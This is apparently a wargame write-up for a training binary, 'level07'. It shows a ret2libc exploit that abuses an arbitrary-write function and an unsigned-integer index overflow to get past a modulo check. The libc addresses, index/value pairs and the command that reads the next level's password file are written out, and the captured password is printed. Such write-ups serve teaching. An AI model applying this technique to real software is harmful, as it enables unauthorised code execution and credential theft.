We get the binary out of the Vm using this cmd:

`scp -P 4242 level07@192.168.56.103:./level07 .binary/level07`


use gdb to get offset 
```
    bt - backtrace: show stack functions and args
    info frame - show stack start/end/args/locals pointers
    x/500x $sp - show stack memory
```

We find 456

Since the store_number function let us put data at arbitry position we can change eip to let us launch a shell.

Since the index number we put is *4 we don really care of the check for our index % 3 since we can overflow.

Needed addr and decimal value :
* system   0xf7e6aed0 => 4159090384
* exit     0xf7e5eb70 => 4159040368
* /bin/sh  0xf7f897ec => 4160264172

So we need to store like this
* index => value
* 114 => 4159090384
* 115 => 4159040368
* 116 => 4160264172

since we can't put at 114 (cause 114 % 3 == 0), we need to overflow unsigned int

`(UNSIGNED_INT_MAX + 1)/ 4  + 114`\
`(4294967295 + 1)/ 4 + 114` = `1073741938`

So at index `1073741938` we store `4159090384`\
   at index `115`		 we store `4159040368`\
   at index `116`		 we store `4160264172`\
We can now quit and have a shell :D
```s
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```